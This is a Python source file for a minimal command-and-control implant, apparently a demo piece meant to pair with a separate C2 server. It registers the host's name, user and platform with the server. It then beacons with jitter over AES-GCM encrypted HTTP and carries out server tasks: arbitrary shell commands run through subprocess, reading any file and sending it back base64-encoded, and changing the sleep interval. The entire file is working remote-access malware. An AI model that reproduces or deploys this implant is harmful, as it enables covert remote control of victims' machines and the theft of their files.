"""Minimal Python implant: register, beacon, run SHELL/DOWNLOAD/SLEEP/EXIT."""
from __future__ import annotations

import argparse
import base64
import getpass
import hashlib
import os
import platform
import random
import secrets
import socket
import subprocess
import sys
import time
from urllib import request as urlreq

from Crypto.Cipher import AES  # type: ignore


PSK = "change-me-shared-key"


def _b64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def _unb64(data: str) -> bytes:
    return base64.b64decode(data.encode("ascii"))


def derive_key(psk: str, salt: bytes) -> bytes:
    # must match c2/crypto.py exactly
    return hashlib.pbkdf2_hmac("sha256", psk.encode("utf-8"), salt, 100_000, dklen=32)


def encrypt(plaintext: str, key: bytes) -> str:
    nonce = os.urandom(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ct, tag = cipher.encrypt_and_digest(plaintext.encode("utf-8"))
    return _b64(nonce + tag + ct)


def decrypt(blob: str, key: bytes) -> str:
    raw = _unb64(blob)
    nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ct, tag).decode("utf-8")


def _post(url: str, payload: dict, headers: dict | None = None) -> dict:
    import json

    data = json.dumps(payload).encode("utf-8")
    req = urlreq.Request(url, data=data, headers={"Content-Type": "application/json"})
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    with urlreq.urlopen(req, timeout=15) as resp:  # noqa: S310
        return json.loads(resp.read().decode("utf-8"))


def register(base: str, psk: str) -> tuple[str, bytes]:
    nonce = secrets.token_bytes(16)
    reg_key = derive_key(psk, nonce)
    payload = f"{socket.gethostname()}|{getpass.getuser()}|{platform.platform()}"
    resp = _post(
        f"{base}/register",
        {"nonce": nonce.hex(), "enc": encrypt(payload, reg_key)},
    )
    # the server replies with the agent id encrypted under the registration key
    msg = decrypt(resp["enc"], reg_key)
    _ok, agent_id = msg.split("|", 1)
    session_key = derive_key(psk, agent_id.encode("utf-8") + nonce)
    return agent_id, session_key


def run_task(cmd: str, args: list[str]) -> str:
    if cmd == "SHELL":
        try:
            out = subprocess.run(  # noqa: S602
                " ".join(args),
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
            )
            return (out.stdout + out.stderr).strip() or "(no output)"
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"
    if cmd == "UPLOAD":
        # server -> agent: payload is "<remote_path>:<b64 content>"
        local, remote = args
        return f"upload not implemented in demo (would write {remote} from {local})"
    if cmd == "DOWNLOAD":
        path = args[0]
        try:
            with open(path, "rb") as fh:
                return _b64(fh.read())
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"
    if cmd == "SLEEP":
        return f"sleep set to {args[0]}"
    if cmd == "EXIT":
        print("[implant] received EXIT, dying")
        sys.exit(0)
    return f"unknown command: {cmd}"


def beacon_loop(base: str, agent_id: str, key: bytes, interval: float) -> None:
    while True:
        try:
            resp = _post(
                f"{base}/beacon",
                {"enc": encrypt("HEARTBEAT", key)},
                headers={"X-Agent": agent_id},
            )
            msg = decrypt(resp["enc"], key)
            if msg == "NOP":
                pass
            elif msg.startswith("TASK:"):
                _, task_id, cmd_line = msg.split(":", 2)
                parts = cmd_line.split(" ")
                cmd, args = parts[0], parts[1:]
                print(f"[implant] executing {cmd} {args}")
                result = run_task(cmd, args)
                _post(
                    f"{base}/beacon",
                    {"enc": encrypt(f"RESULT:{task_id}:{result}", key)},
                    headers={"X-Agent": agent_id},
                )
                if cmd == "SLEEP" and args:
                    try:
                        interval = float(args[0])
                        print(f"[implant] interval now {interval}s")
                    except ValueError:
                        pass
        except Exception as e:  # noqa: BLE001
            print(f"[implant] beacon error: {e}")
        time.sleep(interval + random.uniform(0, 1.0))  # jitter


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("--psk", default=PSK)
    ap.add_argument("--interval", type=float, default=5.0)
    args = ap.parse_args()

    base = f"http://{args.host}:{args.port}"
    agent_id, key = register(base, args.psk)
    print(f"[implant] registered as {agent_id}")
    beacon_loop(base, agent_id, key, args.interval)


if __name__ == "__main__":
    main()
